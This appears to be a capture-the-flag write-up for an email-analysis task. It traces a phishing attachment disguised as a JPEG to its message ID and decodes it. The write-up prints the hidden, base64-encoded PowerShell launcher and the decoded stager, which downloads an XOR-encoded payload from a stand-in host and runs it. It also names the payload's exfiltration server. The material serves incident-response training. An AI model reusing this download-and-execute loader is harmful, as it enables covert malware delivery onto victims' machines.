
# **Task 3**

## <ins>Topics:</ins>

Email Analysis

## <ins>Task Description<ins>

With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don't remember anything particularly weird from earlier, but it was a few weeks back, so they're not sure. OOPS has provided a subset of the user's inbox from the day of the communication.

Identify the message ID of the malicious email and the targeted server.

## <ins>Provided Files<ins>

<ul>
<li>User's emails (emails.zip)</li>
</ul>

## <ins>Solution<ins>

### **1) Investigating the emails**

Using `unzip` to extract files from `emails.zip` gives us a set of [.eml files](https://www.loc.gov/preservation/digital/formats/fdd/fdd000388.shtml) that use the [MIME standard](https://en.wikipedia.org/wiki/MIME).

Looking through these files, we see that some contain attachments. We can use `munpack` to extract these attachments. Both this attachment recovery and the unzipping can be done with our script `extract_emails.sh`.

We can start investigating the recovered attachments using `file` to see what kinds of files they are. When we run `file sam2.jpg` we get the following as output:

`sam2.jpg: ASCII text, with very long lines, with no line terminators`

This is a text file, so let's view the contents with `cat sam2.jpg`:

<code>
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AcgBuAGcAZgBuAC4AaQBuAHYAYQBsAGkAZAAvAHAAcgBvAHAAZQByAHQAeQAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADMAMAAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
</code>

This attachment is malicious and starts up a hidden and silent Powershell script from the base64 encoding.

Using `grep "sam2\.jpg" ./emails/*` reveals this attachment came from `message_5.eml`. Opening `message_5.eml` in a text editor we can find the message ID of the malicious email:

161583639600.22130.9350319649893423064@oops.net

### **2) Decoding the powershell script**

Next, we need to see what the decoded powershell script looks like. We can use the Python standard library `base64` to decode the script.

Running our script `decode_ps_script.py` results in the following contents for `decoded_ps_script.ps1`:

<code>
$bytes = (New-Object Net.WebClient).DownloadData('http://rngfn.invalid/property')

$prev = [byte] 30

\$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;$prev = $bytes[$i] -bxor $prev<br>
&nbsp;&nbsp;&nbsp;&nbsp;$prev<br>
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
</code>

The script downloads a file called `property`, decodes the file contents with xor operations, and then runs the decoded payload powershell script.

### **3) Obtaining and decoding the powershell payload**

To get the `property` file, we can open `capture.pcap` from Task 1 in Wireshark again and use `File > Export Objects > HTTP` to save the file.

Once we have the file, we can reproduce the xor decoding in Python to get the decoded payload.

After running our script `decode_ps_payload.py`, we open the resulting `ps_payload.ps1` file and can see the server the powershell script sends information to:

http://ztvms.invalid
